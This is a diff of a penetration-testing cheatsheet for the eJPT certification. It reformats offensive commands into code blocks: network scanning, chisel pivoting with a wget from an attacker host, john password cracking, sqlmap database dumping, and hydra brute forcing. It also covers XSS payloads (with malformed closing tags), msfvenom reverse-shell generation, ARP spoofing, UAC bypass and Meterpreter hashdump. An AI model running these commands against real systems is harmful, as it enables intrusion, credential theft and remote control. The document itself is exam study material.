@@ -1,168 +1,211 @@
 # eJPT-Cheatsheet
 
 ## fPing
+```sh
 fping -a -g x.x.x.x/24 2>/dev/null > targets
-
+```
 ## Nmap
-nmap -sn x.x.x.x/24\
-nmap -sV -p- -iL targets -oN nmap.initial -v\
-nmap -A -p- -iL targets -oN nmap.aggressive -v\
+```sh
+nmap -sn x.x.x.x/24
+nmap -sV -p- -iL targets -oN nmap.initial -v
+nmap -A -p- -iL targets -oN nmap.aggressive -v
 nmap -p<port> --script=vuln -v <target-IP>
+```
 
 **Custom nmap scan (Not from the course)**
+```sh
 nmap -p- -sS --open -T4 -n -Pn -iL targets -oN alltargetports
-nmap -sCV -pxxx,xxx,xxxx -Pn -vvv x.x.x.x -oN portversion
+nmap -sCV -p<ports> -Pn -vvv <ip-to-scan> -oN portversion
+```
 
 ## IP Route
-**Syntax**\
-ip route add \<Network-range\> via \<router-IP\> dev \<interface\>\
-eg.\
-ip route add x.x.x.x/24 via x.x.x.x dev tap0
-
+```sh
+ip route add <Network-range> via <router-IP> dev <interface>
+```
 ## Pivoting without Metasploit
-**For this I will use chisel tool**
-**Pass chisel to the machine to pivot**
-(Attacker) python -m SimpleHTTPServer xxxx
-           nc -lvp
-(Machine to pivot) wget <attacker-ip>:xxxx/chisel
-
-**Attacker machine**
+**For this I will use chisel tool**\
+**Pass chisel to the machine to pivot**\
+**1. Attacker** 
+```sh
+python -m SimpleHTTPServer xxxx
+nc -lvp xxxx
+```
+**2. Machine to pivot** 
+```sh
+wget <attacker-ip>:<port>/chisel
+```
+**Pivoting configuration**\
+**3. Attacker machine**
+```sh
 ./chisel server --reverse -p xxxx
-
-**Machine to pivot**
-./chisel client <attacker-ip> 127.0.0.1:xxxx:<target-ip>:xxxx
-
+```
+**4. Machine to pivot**
+```sh
+./chisel client \<attacker-ip\> 127.0.0.1:xxxx:\<target-ip\>:xxxx
+```
 ## John
-john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5\
-unshadow passwd shadow > unshadowed.txt\
+```sh
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
+unshadow passwd shadow > unshadowed.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+```
 
 ## dirb
-dirb http://x.x.x.x/ \
+```sh
+dirb http://x.x.x.x/
 dirb http://x.x.x.x/dir -u admin:admin
-
+```
 *Faster using dirbuster. Threads at 20 and use /usr/share/wordlists/dirb/common.txt wordlist. Larger wordlists are not worth it for the exam*
 
 ## Netcat
-**Listening for reverse shell**\
+**Listening for reverse shell**
+```sh
 nc -lvp 1234
-
-**Banner Grabbing**\
-nc -nv x.x.x.x \<port\>
-
+```
+**Banner Grabbing**
+```sh
+nc -nv x.x.x.x <port>
+```
 ## SQLMap
 #### Check if injection exists
-sqlmap -r Post.req\
-sqlmap -u "http://x.x.x.x/file.php?id=1" -p id\
+```sh
+sqlmap -r Post.req
+sqlmap -u "http://x.x.x.x/file.php?id=1" -p id
 sqlmap -u "http://x.x.x.x/login.php" --data="user=admin&password=admin"
-
+```
 #### Get database if injection Exists
-sqlmap -r login.req --dbs\
-sqlmap -u "http://x.x.x.x/file.php?id=1" -p id --dbs\
-sqlmap -u "http://x.x.x.x/login.php" --data="user=admin&password=admin" --dbs\
-
+```sh
+sqlmap -r login.req --dbs
+sqlmap -u "http://x.x.x.x/file.php?id=1" -p id --dbs
+sqlmap -u "http://x.x.x.x/login.php" --data="user=admin&password=admin" --dbs
+```
 #### Get Tables in a Database
-sqlmap -r login.req -D dbname --tables\
-sqlmap -u "http://x.x.x.x/file.php?id=1" -p id -D dbname --tables\
+```sh
+sqlmap -r login.req -D dbname --tables
+sqlmap -u "http://x.x.x.x/file.php?id=1" -p id -D dbname --tables
 sqlmap -u "http://x.x.x.x/login.php" --data="user=admin&password=admin" -D dbname --tables
-
+```
 #### Get data in a Database tables
-sqlmap -r login.req -D dbname -T table_name --dump\
-sqlmap -u "http://x.x.x.x/file.php?id=1" -p id -D dbname -T table_name --dump\
+```sh
+sqlmap -r login.req -D dbname -T table_name --dump
+sqlmap -u "http://x.x.x.x/file.php?id=1" -p id -D dbname -T table_name --dump
 sqlmap -u "http://x.x.x.x/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump
-
+```
 ## Hydra
-**SSH Login Bruteforcing**\
-hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u x.x.x.x ssh\
-hydra -v -V -u -l root -P passwords.txt -t 1 -u x.x.x.x ssh\
+**SSH Login Bruteforcing**
+```sh
+hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u x.x.x.x ssh
+hydra -v -V -u -l root -P passwords.txt -t 1 -u x.x.x.x ssh
+```
 *Replace ssh for other services when needed*
 
-**HTTP POST Form**\
+**HTTP POST Form**
+```sh
 hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V
-
+```
 
 ## XSS
-\<script\>alert(1)\</script\>\
-\<ScRiPt\>alert(1)\</ScRiPt\>
-
+```sh
+<script>alert(1)<script>
+<ScRiPt>alert(1)<ScRiPt>
+```
 *XSS filter bypass cheatsheet*\
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
 
 ## msfvenom shells
-**JSP Java Meterpreter Reverse TCP**\
+**JSP Java Meterpreter Reverse TCP**
+```sh
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp
-
-**WAR**\
+```
+**WAR**
+```sh
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war
-
-**PHP**\
+```
+**PHP**
+```sh
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
-
-**PHP non meterpreter**\
-php	msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
-
+```
+**PHP non meterpreter**
+```sh
+msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+```
 ## Metasploit Meterpreter autoroute
+```sh
 run autoroute -s x.x.x.x/24
-
+```
 ## ARPSpoof
-echo 1 > /proc/sys/net/ipv4/ip_forward\
-arpspoof -i <interface> -t <target> -r <host>\
+```sh
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i <interface> -t <target> -r <host>
 arpspoof -i tap0 -t x.x.x.x -r x.x.x.x
-
+```
 ## SMB Enumeration
-**Get shares, users, groups, password policy**\
-smbclient -L //x.x.x.x/\
-enum4linux -U -M -S -P -G x.x.x.x\
-nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains x.x.x.x -p 135,139,445 -v\
+**Get shares, users, groups, password policy**
+```sh
+smbclient -L //x.x.x.x/
+enum4linux -U -M -S -P -G x.x.x.x
+nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains x.x.x.x -p 135,139,445 -v
 nmap -p445 --script=smb-vuln-* x.x.x.x -v
-
-**Access Share**\
+```
+**Access Share**
+```sh
 smbclient //x.x.x.x/share_name
-
+```
 ## FTP Enumeration
-nmap --script=ftp-anon x.x.x.x -p21 -v\
+```sh
+nmap --script=ftp-anon x.x.x.x -p21 -v
 nmap -A -p21 x.x.x.x -v
-
-**Login to FTP server**\
+```
+**Login to FTP server**
+```sh
 ftp x.x.x.x
-
+```
 **Login to FTP server no common port**
+```sh
 ftp x.x.x.x xxxx
-
+```
 ## Meterpreter
-ps\
-getuid\
-getpid\
-getsystem\
+```sh
+ps
+getuid
+getpid
+getsystem
 ps -U SYSTEM
-
-**CHECK UAC/Privileges**\
+```
+**CHECK UAC/Privileges**
+```sh
 run post/windows/gather/win_privs
-
-**BYPASS UAC**\
-*Background the session first*\
-exploit/windows/local/bypassuac\
+```
+**BYPASS UAC**
+```sh
+*Background the session first*
+exploit/windows/local/bypassuac
 set session
-
-**After PrivEsc**\
-migrate \<pid\>\
+```
+**After PrivEsc**
+```sh
+migrate <pid>
 hashdump
-  
+```
 ## Windows Command Line
-**Search for a file starting from current directory**\
-dir /b/s "\*.conf\*"\
-dir /b/s "\*.txt\*"\
+**Search for a file starting from current directory**
+```sh
+dir /b/s "\*.conf\*"
+dir /b/s "\*.txt\*"
 dir /b/s "\*filename\*"
-
-**Routing table**\
-route print\
+```
+**Routing table**
+```sh
+route print
 netstat -r
-
-**Check Users**\
+```
+**Check Users**
+```sh
 net users
-
-**List drives on the machine**\
+```
+**List drives on the machine**
+```sh
 wmic logicaldisk get Caption,Description,providername
-
+```
 
